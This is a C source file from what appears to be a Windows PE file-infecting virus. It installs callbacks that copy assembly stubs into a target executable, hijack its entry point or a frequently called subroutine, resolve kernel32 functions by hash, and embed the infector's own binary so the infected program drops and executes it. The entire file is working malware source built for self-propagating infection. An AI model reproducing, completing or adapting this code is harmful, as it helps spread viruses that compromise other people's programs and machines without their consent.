/* stub installer callbacks for the stubs in stub.asm
 * shebaw
 * TO FIX: get_kernel32_addr2's method doesn't work on forwarded functions
 *
 */
#include <windows.h>
#include <stdint.h>
#include "pe_misc.h"
#include "infect.h"
#include "stub.h"
#include "patch.h"
#include "stub_inst.h"
#include "conf.h"

#define SEC_EXECUTE_READ	(IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE)
#define SELF_ID			0xB16B00B5

/* global variables */
static DWORD g_self_size = 0;
static TCHAR g_self_path[MAX_PATH + 1];

struct plc_hldr_dtls {
	int is_offset;
	DWORD val;
};

static int stub2index(const void *stub);

static int nsearch(const void *haystack, const void *needle, 
		uint32_t hlen, uint32_t nlen, uint32_t *index)
{
	uint32_t i;
	for (i = 0; i <= hlen - nlen; ++i) {
		if (memcmp((void *)((char *)haystack + i), needle, nlen) == 0) {
			*index = i;
			return 1;
		}
	}
	return 0;
}

static DWORD *find_place_holder(void *haystack, uint32_t hlen, 
		uint32_t sindex, uint32_t *index)
{
	const DWORD needle = PLACE_HOLDER;
	uint32_t cindex;

	nsearch((void *)((char *)haystack + sindex), &needle, 
			hlen - sindex, sizeof(needle), &cindex);
	*index += cindex;
	return (DWORD *)((char *)haystack + *index);
}

static void patch_stub_addrs(void *dest, uint32_t dlen, const struct plc_hldr_dtls *phldrs, 
		uint32_t nphldrs, const struct inf_info *pe_inf_info)
{
	uint32_t cindex;
	struct inf_stub *inf_stubs;
	uint32_t i;

	cindex = 0;
	inf_stubs = pe_inf_info->inf_stubs;
	for (i = 0; i < nphldrs; ++i) {
		uint32_t index;
		DWORD value;

		index = stub2index((void *)phldrs[i].val);
		if (index == -1) {			/* is normal value */
			value = phldrs[i].val;
		} else {				/* is a pointer to an inserted stub */
			/* if the destination stub isn't inserted, continue to the next stub */
			if (!inf_stubs[index].is_inserted)
				continue;
			value = inf_stubs[index].rva;
		}
		if (phldrs[i].is_offset)
			value -= inf_stubs[0].rva + base_offset;
		*find_place_holder(dest, dlen, cindex, &cindex) = value;
	}
}

/* returns the address it was copied to */
static void *copy_stub(void *pe_map, void *stub, size_t stub_size, 
		DWORD dest_rva, struct inf_info *pe_inf_info)
{
	IMAGE_NT_HEADERS *nthdrs;

	nthdrs = &pe_inf_info->pehdr.nthdrs;
	return memcpy((void *)((char *)pe_map + rva_to_raw(dest_rva, nthdrs)),
		stub, 
		stub_size);
}

/* ==============stub installation callbacks============== */
static int se_inst_cb(void *pe_map, struct inf_stub *cur_stub,
		struct inf_info *pe_inf_info)
{
	void *dest;
	struct plc_hldr_dtls phldrs[] = {
		{TRUE, (DWORD)load_kernel32_funcs},
		{TRUE, (DWORD)drop_and_execute},
		{FALSE, 0},			/* is cr_type epo_most_ref_subr_t */
		{FALSE, 0},			/* mark_success */
		{FALSE, 0},			/* address to the subroutine */
		{FALSE, 0},			/* is 3-byte prolog */
		{FALSE, 0}			/* get_oep */
	};

	if (pe_inf_info->cr_type == epo_most_ref_subr_t) {
		phldrs[2].val = TRUE;		/* is cr_type epo_most_ref_subr_t */
		phldrs[4].val = pe_inf_info->redr_inf.sref_info.subr_rva - (cur_stub->rva + base_offset);
		phldrs[5].val = pe_inf_info->redr_inf.sref_info.prolog_size == 3;
	} else {
		/* mark_success */
		phldrs[3].is_offset = TRUE;
		phldrs[3].val = (DWORD)mark_success;
		/* get_oep */
		phldrs[6].is_offset = TRUE;
		phldrs[6].val = (DWORD)get_oep;
	}
	dest = copy_stub(pe_map, stub_entry, stub_entry_size,
			cur_stub->rva, pe_inf_info);
	patch_stub_addrs(dest, stub_entry_size, phldrs,
			_countof(phldrs), pe_inf_info);
	patch_cr_ins(pe_inf_info, pe_map, cur_stub);
	return 1;
}

static int go_inst_cb(void *pe_map, struct inf_stub *cur_stub,
		struct inf_info *pe_inf_info)
{
	void *dest;
	struct plc_hldr_dtls phldrs[2];

	/* phldr[0] offset/ptr to oep
	 * phdlr[1] is absolute call */
	phldrs[0].is_offset = TRUE;
	phldrs[1].is_offset = FALSE;
	if (pe_inf_info->cr_type == ep_t) {
		phldrs[0].val = pe_inf_info->oep;
		phldrs[1].val = FALSE;
	} else {
		IMAGE_NT_HEADERS *nthdrs;
		DWORD operand_rva;

		nthdrs = &pe_inf_info->pehdr.nthdrs;
		operand_rva = pe_inf_info->redr_inf.ins_info.oprnd_rva;
		if (pe_inf_info->redr_inf.ins_info.redr_t == rel_far_call_t) {
			/* offset is calculated from the end of the current instruction */
			phldrs[0].val = pe_inf_info->redr_inf.ins_info.oprnd_rva + sizeof(DWORD) + 
				pe_inf_info->redr_inf.ins_info.oprnd;
			phldrs[1].val = FALSE;
		} else {
			/* the operand contains the va so change it to rva */
			phldrs[0].val = pe_inf_info->redr_inf.ins_info.oprnd - 
				nthdrs->OptionalHeader.ImageBase;
			/* dereference it */
			phldrs[1].val = TRUE;
		}
	}

	dest = copy_stub(pe_map, get_oep, get_oep_size,
			cur_stub->rva, pe_inf_info);
	patch_stub_addrs(dest, get_oep_size, phldrs,
			_countof(phldrs), pe_inf_info);
	return 1;
}

static int dae_inst_cb(void *pe_map, struct inf_stub *cur_stub, 
		struct inf_info *pe_inf_info)
{
	void *dest;
	const struct plc_hldr_dtls phldrs[] = {
		{TRUE, (DWORD)get_infctr_details},
		{TRUE, (DWORD)drop_file},
		{TRUE, (DWORD)execute_file},
	};

	dest = copy_stub(pe_map, drop_and_execute, drop_and_execute_size, 
		cur_stub->rva, pe_inf_info);
	/* patch the stub addresses */
	patch_stub_addrs(dest, drop_and_execute_size, phldrs, 
		_countof(phldrs), pe_inf_info);
	return 1;
}

static int ms_inst_cb(void *pe_map, struct inf_stub *cur_stub,
		struct inf_info *pe_inf_info)
{
	copy_stub(pe_map, mark_success, mark_success_size,
			cur_stub->rva, pe_inf_info);
	return 1;
}

static int gid_inst_cb(void *pe_map, struct inf_stub *cur_stub,
		struct inf_info *pe_inf_info)
{
	struct plc_hldr_dtls phldrs[2];
	void *dest;

	phldrs[0].is_offset = FALSE;
	phldrs[0].val = pe_inf_info->inf_stubs[stub2index((void *)SELF_ID)].offset;
	phldrs[1].is_offset = FALSE;
	phldrs[1].val = g_self_size;
	dest = copy_stub(pe_map, get_infctr_details, get_infctr_details_size, 
		cur_stub->rva, pe_inf_info);
	patch_stub_addrs(dest, get_infctr_details_size, phldrs,
			_countof(phldrs), pe_inf_info);
	return 1;
}

static int lkf_inst_cb(void *pe_map, struct inf_stub *cur_stub,
		struct inf_info *pe_inf_info)
{
	void *dest;
	const struct plc_hldr_dtls phldrs[] = {
		{TRUE, (DWORD)get_kernel32_addr1},
		{TRUE, (DWORD)get_kernel32_addr2},
		{TRUE, (DWORD)get_kernel32_addr3},
		{TRUE, (DWORD)gpa_by_hash},
		{TRUE, (DWORD)mstrlen}
	};

	dest = copy_stub(pe_map, load_kernel32_funcs, load_kernel32_funcs_size, 
		cur_stub->rva, pe_inf_info);
	patch_stub_addrs(dest, load_kernel32_funcs_size, phldrs,
		_countof(phldrs), pe_inf_info);
	return 1;
}

static int gka1_inst_cb(void *pe_map, struct inf_stub *cur_stub,
	struct inf_info *pe_inf_info)
{
	void *dest;
	struct plc_hldr_dtls phldrs[2];
	DWORD gmha_rva, gmhw_rva;

	gmha_rva = gmhw_rva = 0;
	if ((gmha_rva = get_thunk_data_rva(pe_map, "kernel32.dll", "GetModuleHandleA")) == 0)
		gmhw_rva = get_thunk_data_rva(pe_map, "kernel32.dll", "GetModuleHandleW");

	phldrs[0].is_offset = FALSE;
	/* is the unicode version? */
	phldrs[0].val = gmhw_rva ? TRUE : FALSE;

	phldrs[1].is_offset = TRUE;
	phldrs[1].val = gmhw_rva ? gmhw_rva : gmha_rva;

	dest = copy_stub(pe_map, get_kernel32_addr1, get_kernel32_addr1_size,
		cur_stub->rva, pe_inf_info);
	patch_stub_addrs(dest, get_kernel32_addr1_size, phldrs,
		_countof(phldrs), pe_inf_info);
	return 1;
}

static int gka2_inst_cb(void *pe_map, struct inf_stub *cur_stub,
		struct inf_info *pe_inf_info)
{
	IMAGE_NT_HEADERS *nthdrs;
	void *dest;
	struct plc_hldr_dtls phldrs[2] = {
		{TRUE, get_thunk_data_rva(pe_map, "kernel32.dll", NULL)},
		{TRUE, (DWORD)get_module_base}
	};

	nthdrs = GET_NTHDRS(pe_map);
	dest = copy_stub(pe_map, get_kernel32_addr2, get_kernel32_addr2_size, 
		cur_stub->rva, pe_inf_info);
	patch_stub_addrs(dest, get_kernel32_addr2_size, phldrs,
			_countof(phldrs), pe_inf_info);
	return 1;
}

static int gka3_inst_cb(void *pe_map, struct inf_stub *cur_stub,
		struct inf_info *pe_inf_info)
{
	copy_stub(pe_map, get_kernel32_addr3, get_kernel32_addr3_size, 
		cur_stub->rva, pe_inf_info);
	return 1;
}

static int ef_inst_cb(void *pe_map, struct inf_stub *cur_stub,
		struct inf_info *pe_inf_info)
{
	copy_stub(pe_map, execute_file, execute_file_size, 
		cur_stub->rva, pe_inf_info);
	return 1;
}

static int df_inst_cb(void *pe_map, struct inf_stub *cur_stub,
		struct inf_info *pe_inf_info)
{
	copy_stub(pe_map, drop_file, drop_file_size, 
		cur_stub->rva, pe_inf_info);
	return 1;
}

static int gmb_inst_cb(void *pe_map, struct inf_stub *cur_stub,
		struct inf_info *pe_inf_info)
{
	copy_stub(pe_map, get_module_base, get_module_base_size, 
		cur_stub->rva, pe_inf_info);
	return 1;
}

static int gbh_inst_cb(void *pe_map, struct inf_stub *cur_stub,
		struct inf_info *pe_inf_info)
{
	void *dest;
	const struct plc_hldr_dtls phldr = {TRUE, (DWORD)hash_func};

	dest = copy_stub(pe_map, gpa_by_hash, gpa_by_hash_size, 
		cur_stub->rva, pe_inf_info);
	patch_stub_addrs(dest, gpa_by_hash_size, 
		&phldr, 1, pe_inf_info);
	return 1;
}

static int msl_inst_cb(void *pe_map, struct inf_stub *cur_stub,
		struct inf_info *pe_inf_info)
{
	copy_stub(pe_map, mstrlen, mstrlen_size, 
		cur_stub->rva, pe_inf_info);
	return 1;
}

static int msc_inst_cb(void *pe_map, struct inf_stub *cur_stub,
		struct inf_info *pe_inf_info)
{
	copy_stub(pe_map, mstrcmp, mstrcmp_size, 
		cur_stub->rva, pe_inf_info);
	return 1;
}

static int hf_inst_cb(void *pe_map, struct inf_stub *cur_stub,
		struct inf_info *pe_inf_info)
{
	void *dest;
	struct plc_hldr_dtls phldr = {TRUE, (DWORD)mstrlen};

	dest = copy_stub(pe_map, hash_func, hash_func_size, 
		cur_stub->rva, pe_inf_info);
	patch_stub_addrs(dest, hash_func_size, 
		&phldr, 1, pe_inf_info);
	return 1;
}

static int self_inst_cb(void *pe_map, struct inf_stub *cur_stub,
		struct inf_info *pe_inf_info)
{
	void *dest;
	DWORD bytes_to_copy;
	HANDLE fhandle;
	int res;

	res = 0;
	if ((fhandle = CreateFile(g_self_path, GENERIC_READ, FILE_SHARE_READ, 
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
		return 0;
	dest = (void *)((char *)pe_map + cur_stub->offset);
	bytes_to_copy = cur_stub->sdtls.stub_size;
	while (bytes_to_copy) {
		BYTE read_buf[1024];
		DWORD bytes_read;

		if (!ReadFile(fhandle, read_buf, _countof(read_buf), &bytes_read, NULL))
			goto cleanup;
		memcpy(dest, read_buf, bytes_read);
		if (bytes_read != _countof(read_buf))
			break;
		dest = ((char *)dest + bytes_read);
		bytes_to_copy -= bytes_read;
	}
	res = 1;
cleanup:
	CloseHandle(fhandle);
	return res;
}

static int stub_inserted(void *stub, struct inf_stub *inf_stubs)
{
	return inf_stubs[stub2index(stub)].is_inserted;
}

/* ==============stub insertion callbacks============== */
static int go_insert_cb(const void *pe_map, const struct inf_stub *cur_stub,
		const struct inf_info *pe_inf_info)
{
	return pe_inf_info->cr_type != epo_most_ref_subr_t;
}

static int ms_insert_cb(const void *pe_map, const struct inf_stub *cur_stub,
		const struct inf_info *pe_inf_info)
{
	return pe_inf_info->cr_type != epo_most_ref_subr_t;
}

static int gka1_insert_cb(const void *pe_map, const struct inf_stub *cur_stub, 
		const struct inf_info *pe_inf_info)
{
	/* is GetModuleHandleA/W listed in the import table? */
	return get_thunk_data_rva(pe_map, "kernel32.dll", "GetModuleHandleA") ||
		get_thunk_data_rva(pe_map, "kernel32.dll", "GetModuleHandleW");
}

static int gka2_insert_cb(const void *pe_map, const struct inf_stub *cur_stub,
		const struct inf_info *pe_inf_info)
{
	return 0;
	/* support forwarded functions */
}

static int gka3_insert_cb(const void *pe_map, const struct inf_stub *cur_stub,
		const struct inf_info *pe_inf_info)
{
	return !stub_inserted(get_kernel32_addr1, pe_inf_info->inf_stubs) && 
		!stub_inserted(get_kernel32_addr2, pe_inf_info->inf_stubs);
}

static int gmb_insert_cb(const void *pe_map, const struct inf_stub *cur_stub,
		const struct inf_info *pe_inf_info)
{
	/* gmb is only needed if gka2 is inserted */
	return stub_inserted(get_kernel32_addr2, pe_inf_info->inf_stubs);
}

static void get_sdtls(struct stub_dtls *dsdtls)
{
	struct stub_dtls sdtls[STUB_COUNT] = {
		{TRUE, FALSE, stub_entry, stub_entry_size, NULL, se_inst_cb, SEC_EXECUTE_READ},
		{TRUE, FALSE, get_oep, get_oep_size, go_insert_cb, go_inst_cb, SEC_EXECUTE_READ},
		{TRUE, FALSE, drop_and_execute, drop_and_execute_size, NULL, dae_inst_cb, SEC_EXECUTE_READ},
		{TRUE, FALSE, mark_success, mark_success_size, ms_insert_cb, ms_inst_cb, SEC_EXECUTE_READ},
		{TRUE, FALSE, get_infctr_details, get_infctr_details_size, NULL, gid_inst_cb, SEC_EXECUTE_READ},
		{TRUE, FALSE, load_kernel32_funcs, load_kernel32_funcs_size, NULL, lkf_inst_cb, SEC_EXECUTE_READ},
		{TRUE, FALSE, get_kernel32_addr1, get_kernel32_addr1_size, gka1_insert_cb, gka1_inst_cb, SEC_EXECUTE_READ},
		{TRUE, FALSE, get_kernel32_addr2, get_kernel32_addr2_size, gka2_insert_cb, gka2_inst_cb, SEC_EXECUTE_READ},
		{TRUE, FALSE, get_kernel32_addr3, get_kernel32_addr3_size, gka3_insert_cb, gka3_inst_cb, SEC_EXECUTE_READ},
		{TRUE, FALSE, execute_file, execute_file_size, NULL, ef_inst_cb, SEC_EXECUTE_READ},
		{TRUE, FALSE, drop_file, drop_file_size, NULL, df_inst_cb, SEC_EXECUTE_READ},
		{TRUE, FALSE, get_module_base, get_module_base_size, gmb_insert_cb, gmb_inst_cb, SEC_EXECUTE_READ},
		{TRUE, FALSE, gpa_by_hash, gpa_by_hash_size, NULL, gbh_inst_cb, SEC_EXECUTE_READ},
		{TRUE, FALSE, mstrlen, mstrlen_size, NULL, msl_inst_cb, SEC_EXECUTE_READ},
		{TRUE, FALSE, mstrcmp, mstrcmp_size, NULL, msc_inst_cb, SEC_EXECUTE_READ},
		{TRUE, FALSE, hash_func, hash_func_size, NULL, hf_inst_cb, SEC_EXECUTE_READ},
		{TRUE, TRUE, (void *)SELF_ID, 0, NULL, self_inst_cb, 0}
	};
	memcpy(dsdtls, sdtls, _countof(sdtls) * sizeof(struct stub_dtls));
	/* get the file name and size of our self if we didn't already do it */
	if (g_self_size == 0) {
		HANDLE fhandle;

		GetModuleFileName(NULL, g_self_path, _countof(g_self_path));
		fhandle = CreateFile(g_self_path, GENERIC_READ, FILE_SHARE_READ, 
			NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		g_self_size = GetFileSize(fhandle, NULL);
		CloseHandle(fhandle);
	}
	/* set the stub_size in the sdtls entry of ourself */
	dsdtls[_countof(sdtls) - 1].stub_size = g_self_size;
}

void populate_sdtls(struct inf_stub *inf_stubs)
{
	struct stub_dtls sdtls[STUB_COUNT];
	uint32_t i;

	get_sdtls(sdtls);
	for (i = 0; i < STUB_COUNT; ++i)
		inf_stubs[i].sdtls = sdtls[i];
}

static int stub2index(const void *stub)
{
	struct stub_dtls sdtls[STUB_COUNT];
	uint32_t i;

	get_sdtls(sdtls);
	for (i = 0; i < STUB_COUNT; ++i)
		if (sdtls[i].stub == stub)
			return i;
	return -1;
}